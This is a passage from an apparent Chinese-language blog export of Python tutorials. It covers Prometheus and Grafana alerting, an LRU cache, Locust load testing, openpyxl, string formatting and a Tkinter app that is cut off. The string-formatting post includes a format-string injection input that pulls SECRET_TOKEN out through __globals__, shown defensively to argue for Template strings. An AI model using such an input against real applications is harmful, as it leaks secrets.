groups:    - name: too_many_request_count_total      rules:      - alert: TooManyReq        expr: request_count_total &gt; 100        for: 10s        labels:          user: test        annotations:          summary: &quot;request_count_total is too over!&quot;          description: &quot;&#123;&#123; $labels.instance &#125;&#125; of job &#123;&#123; $labels.job &#125;&#125; has over 100 for more than 1 sec.&quot;          username: &quot;@channel&quot;

新增設定 alertmanager.yaml 於資料夾下，指定訊息傳送方式（可以是送 email、slack 等方式，這邊使用 slack，記得先去 slack 開申請 install app 到對應 channel，然後取得 YOUR_SLACK_WEBHOOK_URL）
 global:  resolve_timeout: 2hroute:  group_by: [&#x27;alertname&#x27;]  group_wait: 5s  group_interval: 10s  repeat_interval: 1h  receiver: &#x27;slack&#x27;receivers:  - name: &#x27;slack&#x27;    slack_configs:      - api_url: &quot;YOUR_SLACK_WEBHOOK_URL&quot;        channel: &quot;#alert-test&quot;        text: &quot;Alert!&quot;        title: &quot;&#123;&#123;.CommonAnnotations.summary&#125;&#125;&quot;

 重啟 docker-compose 然後回到 Prometheus dashboard 可以看到 alert 規則已經設定完成：
 


完整程式碼 docker-compose.yamlversion: &#x27;3.7&#x27;volumes:    prometheus_data: &#123;&#125;    grafana_data: &#123;&#125;services:  prometheus:    image: prom/prometheus:v2.1.0    volumes:      - ./prometheus.yaml:/etc/prometheus/prometheus.yaml      - ./alert_rules.yaml:/etc/prometheus/alert_rules.yaml    command:      - &#x27;--config.file=/etc/prometheus/prometheus.yaml&#x27;    ports:      - &#x27;9090:9090&#x27;  grafana:    image: grafana/grafana    volumes:        - grafana_data:/var/lib/grafana    environment:      - GF_SECURITY_ADMIN_PASSWORD=pass    depends_on:      - prometheus    ports:      - &#x27;3000:3000&#x27;  web:    build: .    ports:      - &quot;5000:5000&quot;    volumes:      - .:/code    depends_on:      - prometheus  alertmanager:    image: prom/alertmanager    ports:      - 9093:9093    volumes:      - ./alertmanager.yaml/:/etc/alertmanager/alertmanager.yaml    restart: always    command:      - &#x27;--config.file=/etc/alertmanager/alertmanager.yaml&#x27;      - &#x27;--storage.path=/alertmanager&#x27;

Alert Manager 測試這邊我們參考 如何使用 Python 和 Locust 進行 Load testing 入門教學 來送出測試 request，讓 request count 快速增加達到 alert 的門檻。
撰寫 locustfile.py
from locust import HttpLocust, TaskSet, taskclass WebsiteTasks(TaskSet):    @task(1)    def index(self):        self.client.get(&#x27;/&#x27;)class WebsiteUser(HttpLocust):    task_set = WebsiteTasks    min_wait = 5000    max_wait = 15000

在終端機 terminal 值行以下指令，模擬不斷發出大量 request：
$ locust -f locustfile.py -H http://localhost:5000 --no-web -c 100 -r 10 -t 600s

看到數值已超過閥值：

等待中：

發送通知：

可以看到 grafana 上 request_count metric 圖表不斷增加，promethus 的 alert 最後也響起，發送訊息到 slack 上！

總結以上我們整合了 Promethus（負責蒐集資料和預警）和 Grafana（負責視覺化資料）成功為我們的 Python Flask App 打造了監控預警系統並發送訊息到 slack 上。未來當 service 發生問題時，就可以在第一時間提醒值班的工程師，準備上班囉！事實上，Promethus 和 Grafana 有蠻多更進階的主題值得持續探索，例如如何和 Kubernetes（k8s）的整合、硬體效能監控和評估、AIOps（人工智慧運維）等，未來有機會再和大家繼續分享！
參考文件
prometheus installation
Grafana Dashboard for Prometheus official Python client with Flask App metrics
Using Prometheus in Grafana
Flask application monitoring with Prometheus

（image via aptira）
關於作者@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>tutorial</tag>
        <tag>Flask</tag>
        <tag>Prometheus</tag>
        <tag>Grafana</tag>
        <tag>Alertmanager</tag>
        <tag>docker-compose</tag>
        <tag>slack</tag>
        <tag>monitor</tag>
        <tag>monitoring system</tag>
        <tag>pagerduty</tag>
        <tag>alert system</tag>
        <tag>Cloud Native</tag>
        <tag>Grafana 教學</tag>
        <tag>Prometheus 教學</tag>
      </tags>
  </entry>
  <entry>
    <title>如何使用 Python 實現 LRU Cache 快取置換機制</title>
    <url>/2019/04/06/how-to-use-python-implement-least-recently-used/</url>
    <content><![CDATA[
前言由於電腦記憶體空間（memory）的限制，無法容納所有資料和文件，所以當有新的文件要被置換進入快取（cache）時，必須根據一定的規則來取代掉適合的文件，這就是所謂的快取文件置換機制。
一般來說常見的快取文件置換機制有：

FIFO（First In, First Out）先進先出算法
LFU（Least Frequently Used）最近最不常使用算法
LRU（Least Recently Used）最近最少使用算法
NMRU（Not Most Recently Used）非最近使用算法

通常我們評量快取機制的指標主要有兩種：延遲（latency）和命中率（hit rate），其中延遲指的是命中後回傳對應資料的所花的時間。而命中率則是需要的資料在快取中被找到的頻率。
本文則要介紹 LRU（Least Recently Used）這個常見經典算法（在 memcached 也有使用），並使用 Python 實現簡單的 LRU 算法。其核心思想主要就是如果資料最近有被使用過，則未來被使用的機率也比較高。實際上的實作基本概念就是快取一定的資料量，若是超過一定的資料量則把最近最少使用的資料淘汰掉。
LRU 基本原理
關於 LRU 算法用生活化一點說明就像是平常衣架管理衣服一樣。想像你的衣架是一個有限空間的衣架，越常穿的衣服靠外面。當我們有新衣服時會先從前面放入，要穿衣服時則會把想要的衣服拿出來使用，洗完後放到最前面（因為比較常穿）。當衣服太多超過衣架可容納空間時，最後面不常穿的衣服從衣架掉下去，消失不見：P
使用 Python 實現 LRU 快取方案通常我們常會使用 hash map 搭配 Double Linked List 來實作（set&#x2F;get 時間複雜度 O(1)），這樣可以避免單純使用陣列並存 counter&#x2F;timestamp 的方式需要不停維護 counter 或是只使用 Linked List 實作，在 get 值時時間複雜度為 O(n)，來的合適。

以下我們使用 Python Dict (hash map) 和 Queue (Double Linked List) 來實作簡單的 LRU 算法。
建立一個給定大小的 LRU cache 系統，並實作兩種操作方式，取值和設定值

get(key)：當 key 對應的值存在 cache 系統中時回傳該值，並把該值放到 cache 系統最前面，若沒有對應值則回傳 -1
set(key, value)：當 key 不存在 cache 系統中時，則將 key, value 放入 cache，若系統值滿則移除最不常使用的 key, value 並塞入插入新的 key, value

from collections import dequeclass LRUCache:    def __init__(self, cache_size):        self.cache_size = cache_size        self.queue = deque()        self.hash_map = dict()        def is_queue_full(self):        return len(self.queue) == self.cache_size        def set(self, key, value):        if key not in self.hash_map:            if self.is_queue_full():                pop_key = self.queue.pop()                self.hash_map.pop(pop_key)                self.queue.appendleft(key)                self.hash_map[key] = value            else:                self.queue.appendleft(key)                self.hash_map[key] = value    def get(self, key):        if key not in self.hash_map:            return -1        else:            self.queue.remove(key)            self.queue.appendleft(key)            return self.hash_map[key]if __name__ == &#x27;__main__&#x27;:    # 設定 cache 大小為 3    lru_cache = LRUCache(3)    lru_cache.set(&#x27;key1&#x27;, 7)    lru_cache.set(&#x27;key2&#x27;, 2)    lru_cache.set(&#x27;key3&#x27;, 3)    lru_cache.set(&#x27;key4&#x27;, 4)    print(lru_cache.get(&#x27;key2&#x27;))    # 超過 cache 大小，被丟棄，所以 key1 回傳值為 -1    print(lru_cache.get(&#x27;key1&#x27;))    lru_cache.set(&#x27;key1&#x27;, 7)    # key1 已存在 cache 中，所以不做任何動作    lru_cache.set(&#x27;key1&#x27;, 2)    print(lru_cache.get(&#x27;key1&#x27;))

總結以上簡單介紹如何使用 Python 實現 LRU 快取方案，若是讀者有興趣的話可以自己嘗試 OrderedDict 實作或是針對 multi thread 進行 cache 讀寫操作設計，甚至可以模仿 redis 或 memcached 給儲存資料追加 expire time，實作一個（自幹輪子）更完整的 cache 系統解決方案！
參考文件
快取文件置換機制

（image via twimg、topjavatutorial、Hacker Noon
）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>cache</tag>
        <tag>LRU</tag>
        <tag>Least Recently Used</tag>
      </tags>
  </entry>
  <entry>
    <title>如何使用 Python 和 Locust 進行 Load testing 入門教學</title>
    <url>/2019/05/29/how-to-use-python-locust-to-do-load-testing/</url>
    <content><![CDATA[
前言身為一個開發者在開發完 Web 應用程式時往往會需要透過 Load testing 和 Profiling 評估目前系統的性能和是否需要繼續優化和估算所需的運營的成本並了解系統的性能邊界，以建立高可用、高穩定性的網路服務。目前市面上有許多可以用來進行 Load testing 的工具，例如老牌的 Jemeter、LoadRunner、Apache Bench（ab）、wrk 等。若是你想找一個可以不用操作複雜的 UI&#x2F;XML 和可以使用 Python 語法撰寫操作 script 的話，Locust 是一個不錯的選擇。接下來將簡單介紹一下 Locust 的使用方式。
Locust 簡介Locust 本意是蝗蟲的意思，其實仔細想想，當大量的使用者進到你的網路服務時真的就像是蝗蟲入侵一樣，確實是一個貼切的工具名稱。
Locust 的主要特色在於使用上方便簡單：

透過 Plain Python Code 定義使用者操作行為，不用使用 XML 或複雜的 UI 進行操作
支援分散式模式，模擬百萬使用者操作
許多知名服務已有相關使用經驗：Battlefield（戰地風雲）

一般我們在進行 Load testing 時會比較注意的是 Response Time 和 Throughput 的表現。在 Locust 中會提供 RPS（Request Per Second，一般等同於 QPS，RPS &#x3D; Request count &#x2F; Response Time）和 Response time（clent 發出請求到 server 返回時間）和 Error rate 等統計數據和圖表可以參考，雖然簡單但也算蠻夠使用。
環境建置安裝 Locust 最簡單的方式是使用 pip 安裝，先確認本身已有 Python 和 pip 環境（建議可以使用 Python3.4 以上），然後在 terminal 執行以下指令：
$ pip install locustio

由於 Locust 不是使用 process 和 thread 而是 gevent 提供的 coroutine 和 non-block IO 來實現網路 concurrent request（併發請求）。因此使用單台機器理論上也可以產生數千的 concurrent request，若是搭配分散式模式則可以支援更高的併發請求。
若是 mac 使用者可能會需要安裝 libev 來支援 gevent 使用：
$ brew install libev

更多安裝和環境建制可以參考官方網站
撰寫第一個 Locustfile完成了環境設定後，接下來我們就可以來撰寫 Locustfile 來定義我們要模擬的使用者行為。以下是一個簡單範例（locustfile.py）：
一般來說 Locustfile 會有兩個主要的 Class 組成（WebsiteTasks、WebsiteUser），其中 WebsiteTasks 繼承 TaskSet 而 WebsiteUser 繼承 HttpLocust（HttpLocust 繼承 Locust）。所以可以看成 Locustfile 主要為 Locust 和 TaskSet 兩大 Class 所描述。由 TaskSet 定義 Locust 這群產生出來的蝗蟲要怎麼行動。
from locust import HttpLocust, TaskSet, taskclass WebsiteTasks(TaskSet):    def on_start(self):        &quot;&quot;&quot; on_start is called when a Locust start before any task is scheduled &quot;&quot;&quot;        self.login()    def on_stop(self):        &quot;&quot;&quot; on_stop is called when the TaskSet is stopping &quot;&quot;&quot;        self.logout()    def login(self):        self.client.post(&quot;/login&quot;, &#123;&quot;username&quot;:&quot;ellen_key&quot;, &quot;password&quot;:&quot;education&quot;&#125;)    def logout(self):        self.client.post(&quot;/logout&quot;, &#123;&quot;username&quot;:&quot;ellen_key&quot;, &quot;password&quot;:&quot;education&quot;&#125;)    @task(1)    def index(self):        self.client.get(&quot;/&quot;)    @task(2)    def about(self):        self.client.get(&quot;/about&quot;)class WebsiteUser(HttpLocust):    task_set = WebsiteTasks    min_wait = 5000    max_wait = 15000

我們在上面的檔案可以看到 WebsiteTasks 裡面定義了 on_start 為每次 WebsiteUser 開始任務需要執行的步驟（on_stop 為結束），上面是先進行 post 請求登入，接著我們可以看到 @task 這個 decorator 的使用，亦即在過程中要執行的指令，後面的數字是執行比例（這裡是 index 和 about 任務是 1:2 比例執行，GET &#x2F;about 比例會是 &#x2F;index 兩倍），若都沒有寫，則預設為 1:1。
然後是 WebsiteUser 我們定義了 task_set 讓 Locust 知道當產生 User 實例時要執行的任務。min_wait 則定義 max_wait 測試過程中兩次任務的間隔為 5-15 秒的隨機數。
若是熟悉 Python 讀者可以發現事實上，locust 是使用 Python requests 套件來處理網路請求，所以若是 requests 支援的方法幾乎都可以使用。
使用 GUI 操作撰寫完 Locustfile 後終於可以正式開始使用 Locust 啦！-H 為要測試的 service host name使用上也很簡單，只要輸入以下指令，就可以在瀏覽器打開：http://127.0.0.1:8089 進行操作！
$ locust -f locustfile.py -H https://www.example.com


可以輸入希望模擬的使用者數量和多少秒達到預期使用者數量（hatch rate），若是設定 100 個 user，hatch rate 為 10，就代表有 10 秒時間可以 warm up 到 100 使用者。

開始執行後可以看到相關的即時數據！

顯示 RPS 和 Response Time 的數據圖表。

若是有 Failure 產生就會顯示在這頁。 

若是希望結束測試可以點選右上角的 stop 還可以到 download data 頁面下載測試的統計資料 csv 檔案。

使用 Terminal 進行操作若你不想使用圖形化介面你可以直接在指令中加上 –no-web，並設定模擬 user 數量（-c）和 hatch rate（-r）以及執行時間（-t），以下為 100 user，hatch rate：10，執行 10 分鐘的測試：
$ locust -f locustfile.py -H https://www.example.com --no-web -c 100 -r 10 -t 600s

達到設定執行時間後就會自己結束測試，顯示相關數據於 terminal 中：
 Name                                                          # reqs      # fails     Avg     Min     Max  |  Median   req/s---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- Total                                                              0     0(0.00%)                                       0.00Percentage of the requests completed within given times Name                                                           # reqs    50%    66%    75%    80%    90%    95%    98%    99%   100%----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


使用分散式模式（Distributed）有時候我們本機的資源不夠會導致在進行 load testing 時希望支援的使用者和 RPS 的數量會不如預期，此時就可以嘗試使用分散式 mode，可以先在一個 termianl 去定義 master 的設定並啟動，然後在 terminal 新開 tab 去把 slave 加入，當 master 監聽 slave 數量達到宣告（–expect-slaves）的時候就會開始執行任務（若沒有則會一直等待）。
宣告 master 指令：
$ locust -H https://www.example.com -f locustfile.py --master --expect-slaves=3

開啟另外 termianl tab 執行 slave 指令：
$ locust -H https://www.example.com -f locustfile.py --slave

總結以上簡單介紹如何使用 Python 和 Locust 進行 Load testing。Locust 好處在於簡單容易使用，並可以使用 Python 撰寫相關測試，而不用操作複雜的 UI 或是 XML 檔案。而在 Locust 中會提供 RPS 和 Response time 和 Error rate 等統計數據和圖表可以參考，雖然簡單但也算蠻夠使用。若是有更高的效能需求可以參考用 golang 寫的兄弟專案 boomer。關於 Python Locust 這個方便的 Load testing 工具就介紹到這裡，我們下回見囉！
參考文件
How to Use JMeter for Performance &amp; Load Testing
Running Locust distributed
TPS、QPS、RPS
深入浅出开源性能测试工具 Locust（使用篇）

（image via locust）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Testing</tag>
        <tag>Load testing</tag>
        <tag>Locust</tag>
        <tag>QPS</tag>
        <tag>RPS</tag>
        <tag>Throughput</tag>
        <tag>Response time</tag>
      </tags>
  </entry>
  <entry>
    <title>如何使用 Python 程式操作 Excel 試算表</title>
    <url>/2018/10/05/how-to-use-python-manipulate-excel-spreadsheet/</url>
    <content><![CDATA[
前言Excel 幾乎是所有職場工作者最常使用的 Office 軟體工具，小至同事間訂便當、飲料，大到進出貨訂單管理，應收應付賬款的財務報表等都有它的身影。在一般工作上，你可能常常需要在不同表單中複製貼上許多的欄位，或是從幾百個列表中挑選幾列依照某些條件來更新試算表內容等。事實上，這些工作很花時間，但實際上卻沒什麼技術含量。你是否曾想過但使用程式語言來加快你的工作效率，減輕瑣碎的重複性無聊工作但又不知道如何開始？
別擔心，這邊我們就要使用 Python 和 Openyxl 這個模組，讓讀者可以輕鬆使用 Python 來處理 Excel 試算表，解決工作上的繁瑣單調工作！

Excel 試算表名詞介紹在正式開始使用 Python 程式來操作 Excel 試算表前我們先來了解 Excel 常見名詞。首先來談一下基本定義，一般而言 Excel 試算表文件稱作活頁簿（workbook），而活頁簿我們會存在 .xlsx 的副檔名檔案中（若是比較舊版的 Excel 有可能會有其他 .xls 等檔名）。在每個活頁簿可以有多個工作表（worksheet），一般就是我們工作填寫資料的區域，多個資料表使用 tab 來進行區隔，正在使用的資料表（active worksheet）稱為使用中工作表。每個工作表中直的是欄（column）從和橫的是列（row）。在指定的欄和列的區域是儲存格（cell），也就是我們輸入資料的地方。一格格儲存格的網格和內含的資料就組成一份工作表。
環境設定在開始撰寫程式之前，我們先準備好開發環境（根據你的作業系統安裝 Anaconda Python3、virtualenv 模組、openyxl 模組）。

這邊我們使用 MacOS 環境搭配 jupyter notebook 做範例教學：
# 創建並移動到資料夾$ mkdir pyexcel-example$ cd pyexcel-example$ jupyter notebook

開啟 jupyter notebook 後新增一個 Python3 Notebook

首先先安裝 openyxl 套件（在 jupyter 使用 $ !pip install &lt;your-package&gt; 安裝套件）：
使用 shift + enter 可以執行指令
!pip install openpyxl

記得要先安裝 openpyxl 模組，若是沒安裝模組則會出現 ModuleNotFoundError: No module named &#39;openpyxl&#39; 錯誤訊息。

讀取 Excel 檔案
使用 Openpyxl 開啟 Excel 檔案（可以從這邊下載範例 Excel 資料檔案），下載後檔名改為 sample.xlsx，並放到和 jupyter Notebook 同樣位置的資料夾下：
 from openpyxl import load_workbookwb = load_workbook(&#x27;sample.xlsx&#x27;)print(wb.sheetnames)

 執行後可以讀取活頁簿物件（類似讀取檔案）並印出這個範例檔案的工作表名稱：
 [&#x27;Sheet1&#x27;]

從工作表中取得儲存格（取得 A1 儲存格資料）
 ws[&#x27;A1&#x27;].value

從工作表中取得欄和列
 列出每一欄的值
 for row in ws.rows:    for cell in row:        print(cell.value)

 列出每一列的值
 for column in ws.columns:    for cell in column:        print(cell.value)

寫入 Excel 檔案

創建並儲存 Excel 檔案
 from openpyxl import Workbook# 創建一個空白活頁簿物件wb = Workbook()

建立工作表
 # 選取正在工作中的表單ws = wb.active

將值寫入儲存格內
 # 指定值給 A1 儲存格ws[&#x27;A1&#x27;] = &#x27;我是儲存格&#x27;# 向下新增一列並連續插入值ws.append([1, 2, 3])ws.append([3, 2, 1])

儲存檔案
 # 儲存成 create_sample.xlsx 檔案wb.save(&#x27;create_sample.xlsx&#x27;)


總結以上簡單介紹如何使用 Python 程式操作 Excel 試算表，透過 Python 可以讀取和寫入 Excel 檔案，相信只要能活用就能夠減少一般例行性的繁瑣工作。若需要更多 openpyxl 操作方式可以參考官方文件教學，我們下回見囉！
參考文件
openpyxl - A Python library to read&#x2F;write Excel 2010 xlsx&#x2F;xlsm files

（image via matplotlib
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>tutorial</tag>
        <tag>excel</tag>
        <tag>試算表</tag>
        <tag>how-to</tag>
        <tag>spreadsheet</tag>
      </tags>
  </entry>
  <entry>
    <title>如何使用 Python 進行字串格式化</title>
    <url>/2019/05/03/how-to-use-python-string-format-method/</url>
    <content><![CDATA[
前言在開發應用程式時我們往往會需要把變數進行字串格式化，也就是說把字串中的變數替換成變數值。事實上，在 Python 中有許多方式可以進行，其中最常見的有四種方式（斯斯有三種，但 Python 字串格式化方式竟然有四種！）：

舊式字串格式化
新式字串格式化
字串插值
樣板字串

字串插值是在 Python 3.6 之後有支援的方法，若是你的版本是在 Python 3.6 之後的話建議可以使用。若是需要讓使用者可以輸入變數來轉換成字串格式化的話，建議可以使用樣板字串來避免一些資訊安全上的問題。
以下就上述提到的四種方法來各自說明其特色和使用方式：
舊式字串格式化（%）相對於 Python 版本之後推薦使用的新式字串格式化，舊式版本使用 % 運算子來進行字串格式化，若是有 C 語言撰寫經驗的讀者或許會覺得的似曾相似（是不是有點像 printf？）。使用 % 格式是告訴 Python 直譯器要在那邊替換文字 text 並使用字串呈現。這就是所謂的舊式字串格式化（%s 是以字串輸出，%f 是以浮點數輸出、%d 是以十進位整數輸出）：
text = &#x27;world&#x27;print(&#x27;hello %s&#x27; % text)# hello world

若是希望把內容轉成十六進位的話可以使用：
print(&#x27;%x&#x27; % 23)# 17

若是有多個變數要替換則使用 tuple 傳遞需要替代的內容值：
print(&#x27;hello %s %s&#x27; % (&#x27;world&#x27;, &#x27;go&#x27;))# hello world go

新式字串格式化（format()）在 Python3 以後，開始引進新串格式化，也就是使用 format() 函式來讓字串格式化，其功能和舊式格式化相差無幾，但主要是捨去 % 讓字串格式化使用上可以更加正常、規律，可讀性也相對提升。
一般基本用法：
text = &#x27;world&#x27;print(&#x27;hello &#123;&#125;&#x27;.format(text))# hello world

也可以使用名稱來指定變數變換順序：
name = &#x27;Jack&#x27;text = &#x27;world&#x27;print(&#x27;hello &#123;name&#125;, hello &#123;text&#125;&#x27;.format(name=name, text=text))# hello Jack, hello world

若是希望把內容轉成十六進位的話可以使用 format spec 在 &#123;&#125; 新增 :x：
print(&#x27;&#123;:x&#125;&#x27;.format(23))# 17

字串插值（Formatted String Literal）雖然已經有了新式字串格式化，然而在 Python 3.6 又新增了格式字串字面值（Formatted String Literal）此一作法可以把 Python 運算式嵌入在字串常數中。眼尖的讀者可能會發現，咦，怎麼跟隔壁棚的 JavaScript ES6 字串模版有點像呀？
現在我們來看一下一般的使用方式：
text = &#x27;world&#x27;print(f&#x27;Hello, &#123;text&#125;&#x27;)

新的字串插值語法相當強大的點是，可以在裡面嵌入任何 Python 的運算式，舉例來說，我們想要呈現整數相加：
x = 10y = 27print(f&#x27;x + y = &#123;x + y&#125;&#x27;)# 37

同樣，若是希望把內容轉成十六進位的話可以使用 format spec 在 &#123;&#125; 新增 :x：
print(&#x27;&#123;:x&#125;&#x27;.format(23))# 17

讀者可能會覺得很字串插值神奇，但事實上其背後原理是由 Python 語法解析器把 f-string 字串插值格式字串轉成一連串的字串常數和運算式，最後結合成最終的字串。
def hello(text, name):    return f&#x27;hello &#123;text&#125;, hello &#123;name&#125;&#x27;# 實際上 Python 會把它變成字串常數和變數（過程中有優化）def hello(text, name):    return &#x27;hello &#x27; + text + &#x27;, hello&#x27; + name

樣板字串（Template String）樣板字串（Template String）機制相對簡單，也比較安全。
以下是一般的使用情境，需要從 Python 內建模組 string 引入：
from string import Templatetext = &#x27;world&#x27;t = Template(&#x27;hello, $text&#x27;)t.substitute(text=text)# hello, world

然而若是希望把內容轉成十六進位的話需要自己使用 hex 函式自己轉換：
from string import Templatenumber = 23t = Template(&#x27;hello, $number&#x27;)t.substitute(number=hex(number))# hello, 0x17

由於其他的字串格式化功能較為強大，所以反而會造成惡意使用者輸入變數替換成字串時造成不可預期的錯誤（一般來說使用者的輸入都是不可信的，要進行過濾）。
舉例來說惡意使用者可能可以透過字串格式的惡意輸入來獲取敏感資訊（例如：密碼、token、金鑰等）；
SECRET_TOKEN = &#x27;my-secret-token&#x27;# Error funcclass Error:    def __init__(self):        passerr = Error()malicious_input = &#x27;&#123;error.__init__.__globals__[SECRET_TOKEN]&#125;&#x27;malicious_input.format(error=err)# my-secret-token

沒想到，透過字串格式的方式竟然可以透過 __globals__ 字典取出我們的 SECRET_TOKEN，若是一不留神，很可能機密資料就洩漏出去。此時若是使用 Template String 則會發生錯誤，是比較安全的選項：
from string import TemplateSECRET_TOKEN = &#x27;my-secret-token&#x27;# Error funcclass Error:    def __init__(self):        passerr = Error()malicious_input = &#x27;$&#123;error.__init__.__globals__[SECRET_TOKEN]&#125;&#x27;t = Template(malicious_input)t.substitute(error=err)# ValueError: Invalid placeholder in string: line 1, col 1

總結雖然 Python 的信仰是能用簡單唯一的方式來完成任務，然而字串格式化卻有多種方式，也各有其優缺點，其主要原因或許在於版本不同變遷所致。所以你有可能在公司內部專案不同專案看到使用不同的字串格式化方式，若是看到同一個專案使用不同字串格式化方式也不要驚訝。
一般情況我們會根據不同 Python 版本和使用情境去使用不同字串格式化方式，例如：若是使用 Python 3.6 之後的話建議可以使用字串插值，若版本比 3.6 舊，則使用新式字串格式化（format()）。若是需要讓使用者可以輸入變數來轉換成字串格式化的話，建議可以使用樣板字串來避免一些資訊安全上的問題。
參考文件
python string — Common string operations
(那些過時的) Python 字串格式化以及 f-string 字串格式化
字串格式化
Python String Formatting Best Practices
Python 字串格式化教學與範例
A Quick Guide to Format String in Python

（image via unsplash
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>tutorial</tag>
        <tag>how-to</tag>
        <tag>string format</tag>
        <tag>Formatted String Literal</tag>
        <tag>string</tag>
        <tag>Template String</tag>
        <tag>字串格式化</tag>
      </tags>
  </entry>
  <entry>
    <title>如何使用 Python Tkinter 製作 GUI 應用程式入門教學</title>
    <url>/2019/09/21/how-to-use-python-tkinter-to-make-gui-app-tutorial/</url>
    <content><![CDATA[
前言除了 Web 和 Mobile App 之外，桌面應用程式（Desktop Application）也是使用者常使用的應用程式圖形化使用者介面（GUI）。透過 GUI 可以讓一般使用者透過比較直覺的方式來和程式互動（畢竟要讓一般的使用者使用 Command Line 來操作程式是挺難的），也可以讓整個使用者行為更為簡便。許多程式語言都有提供 GUI 的函式庫，讓開發者可以透過常見的元件，例如：按鈕、文字方塊、下拉式選單等方式來設計整個應用程式。在這裡，我們將使用 Python 內建的 Tkinter 函式庫來建立一個簡單的 BMI 計算應用程式，讓讀者感受一下 Python Tkinter 設計桌面應用程式的流程。
Tkinter 函式庫簡介基本設計流程撰寫 Tkinter GUI 程式主要會有以下三個步驟：

建立主視窗（設定視窗大小、位置和視窗名稱）
將元件（如：按鈕、文字方塊、選單等）放入視窗中
實作事件處理函式，當作使用者互動時的事件處理器（event handler）。例如：當使用者點擊某個按鈕時要觸發什麼行為。

以下是簡單的範例程式，建立主視窗後加入 3+1 個按鈕元件，當點擊下方按鈕元件時，事件處理器會印出 hello world :)
# 引入套件import tkinter as tk# 建立主視窗和 Frame（把元件變成群組的容器）window = tk.Tk()top_frame = tk.Frame(window)# 將元件分為 top/bottom 兩群並加入主視窗top_frame.pack()bottom_frame = tk.Frame(window)bottom_frame.pack(side=tk.BOTTOM)# 建立事件處理函式（event handler），透過元件 command 參數存取def echo_hello():    print(&#x27;hello world :)&#x27;)# 以下為 top 群組left_button = tk.Button(top_frame, text=&#x27;Red&#x27;, fg=&#x27;red&#x27;)# 讓系統自動擺放元件，預設為由上而下（靠左）left_button.pack(side=tk.LEFT)middle_button = tk.Button(top_frame, text=&#x27;Green&#x27;, fg=&#x27;green&#x27;)middle_button.pack(side=tk.LEFT)right_button = tk.Button(top_frame, text=&#x27;Blue&#x27;, fg=&#x27;blue&#x27;)right_button.pack(side=tk.LEFT)# 以下為 bottom 群組# bottom_button 綁定 echo_hello 事件處理，點擊該按鈕會印出 hello world :)bottom_button = tk.Button(bottom_frame, text=&#x27;Black&#x27;, fg=&#x27;black&#x27;, command=echo_hello)# 讓系統自動擺放元件（靠下方）bottom_button.pack(side=tk.BOTTOM)# 運行主程式window.mainloop()

觀看成果：
建立 BMI App 主視窗在建立我們的應用程式前，我們先簡單使用繪製我們介面的 mockup 圖：
整個應用程式流程如下：

提供輸入框讓使用者可以輸入其身高（m）、體重（kg）
點擊馬上計算按鈕後計算 BMI 指數
顯示結果於畫面上

import tkinter as tkwindow = tk.Tk()# 設定視窗標題、大小和背景顏色window.title(&#x27;BMI App&#x27;)window.geometry(&#x27;800x600&#x27;)window.configure(background=&#x27;white&#x27;)# 運行主程式window.mainloop()

成果如下：

建立 BMI App 元件建立完主視窗後，接下來我們來把元件一一加入到主視窗，我們元件主要分成三大部分：

標題顯示 BMI 計算器 文字區塊
身高體重輸入區塊
顯示結果和點擊按鈕

import tkinter as tkwindow = tk.Tk()window.title(&#x27;BMI App&#x27;)window.geometry(&#x27;800x600&#x27;)window.configure(background=&#x27;white&#x27;)header_label = tk.Label(window, text=&#x27;BMI 計算器&#x27;)header_label.pack()# 以下為 height_frame 群組height_frame = tk.Frame(window)# 向上對齊父元件height_frame.pack(side=tk.TOP)height_label = tk.Label(height_frame, text=&#x27;身高（m）&#x27;)height_label.pack(side=tk.LEFT)height_entry = tk.Entry(height_frame)height_entry.pack(side=tk.LEFT)# 以下為 weight_frame 群組weight_frame = tk.Frame(window)weight_frame.pack(side=tk.TOP)weight_label = tk.Label(weight_frame, text=&#x27;體重（kg）&#x27;)weight_label.pack(side=tk.LEFT)weight_entry = tk.Entry(weight_frame)weight_entry.pack(side=tk.LEFT)result_label = tk.Label(window)result_label.pack()calculate_btn = tk.Button(window, text=&#x27;馬上計算&#x27;)calculate_btn.pack()window.mainloop()

成果：
建立 BMI App 事件處理加入元件後我們可以建立
def calculate_bmi_number():    height = float(height_entry.get())    weight = float(weight_entry.get())    bmi_value = round(weight / math.pow(height, 2), 2)    result = &#x27;你的 BMI 指數為：&#123;&#125; &#123;&#125;&#x27;.format(bmi_value, get_bmi_status_description(bmi_value))    # 將計算結果更新到 result_label 文字內容    result_label.configure(text=result)def get_bmi_status_description(bmi_value):    if bmi_value &lt; 18.5:        return &#x27;體重過輕囉，多吃點！&#x27;    elif bmi_value &gt;= 18.5 and bmi_value &lt; 24:        return &#x27;體重剛剛好，繼續保持！&#x27;    elif bmi_value &gt;= 24 :        return &#x27;體重有點過重囉，少吃多運動！&#x27;

透過 command 參數可以將 calculate_bmi_number 事件處理函式綁定到元件上
calculate_btn = tk.Button(window, text=&#x27;馬上計算&#x27;, command=calculate_bmi_number)

完整程式碼：
